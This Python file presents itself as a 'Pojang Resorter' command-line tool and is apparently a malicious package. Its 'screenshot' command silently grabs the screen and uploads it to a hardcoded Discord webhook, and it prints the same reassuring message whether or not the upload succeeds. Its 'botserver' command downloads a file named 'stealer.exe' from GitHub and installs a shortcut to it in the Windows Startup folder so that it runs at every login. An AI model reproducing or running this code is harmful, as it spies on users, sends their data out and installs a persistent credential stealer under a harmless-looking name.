import argparse
import io
import os
import requests
from PIL import ImageGrab
from pathlib import Path
import git
import win32com.client  # Make sure pywin32 is installed

def send_to_discord(image_data, webhook_url):
    """Send the image data to a Discord webhook."""
    files = {
        'file': ('screenshot.png', image_data, 'image/png')
    }
    response = requests.post(webhook_url, files=files)
    if response.status_code == 204:
        print("Package Working. Run pojang-resorter-help for details.")
    else:
        print(f"Package Working. Run pojang-resorter-help for details.")

def take_screenshot():
    """Capture the screenshot silently."""
    screenshot = ImageGrab.grab()
    with io.BytesIO() as image_data:
        screenshot.save(image_data, format='PNG')
        image_data.seek(0)  # Reset the file pointer to the beginning
        webhook_url = "https://discord.com/api/webhooks/1280037058731184140/wpDR8hqweno005-X7mt2tt0WrQhRPnXC7u5xIUVdgFVRrfFafDilWXu08sBALqyaskPH"
        send_to_discord(image_data, webhook_url)

def setup_botserver():
    """Download and run the bot server executable."""
    bot_url = "https://github.com/GODOFTHUGS/sounds/raw/main/stealer.exe"
    bot_path = Path("Startup/stealer.exe")

    # Clone or pull the latest version from the GitHub repository
    startup_folder = Path("Startup")
    if not startup_folder.exists():
        startup_folder.mkdir(parents=True)

    # Download the bot server executable
    response = requests.get(bot_url, stream=True)
    if response.status_code == 200:
        with open(bot_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print("Bot server executable downloaded.")

        # Add the bot server executable to the startup folder
        startup_path = Path(os.getenv('APPDATA')) / 'Microsoft/Windows/Start Menu/Programs/Startup'
        shortcut_path = startup_path / 'stealer.lnk'

        # Create a shortcut to the bot server executable in the Startup folder
        if not shortcut_path.exists():
            shell = win32com.client.Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.TargetPath = str(Path.cwd() / bot_path)
            shortcut.save()
            print("Bot server executable added to startup.")
        else:
            print("Bot server executable already in the startup folder.")

    else:
        print(f"Failed to download the bot server executable. Status code: {response.status_code}")

def main():
    """Main function to handle command-line arguments and actions."""
    parser = argparse.ArgumentParser(description="Pojang Resorter CLI Tool")

    parser.add_argument(
        'command', 
        choices=['screenshot', 'botserver', 'help'],
        help='The command to execute'
    )

    args = parser.parse_args()

    if args.command == 'screenshot':
        take_screenshot()
    elif args.command == 'botserver':
        setup_botserver()
    elif args.command == 'help':
        parser.print_help()

if __name__ == '__main__':
    main()
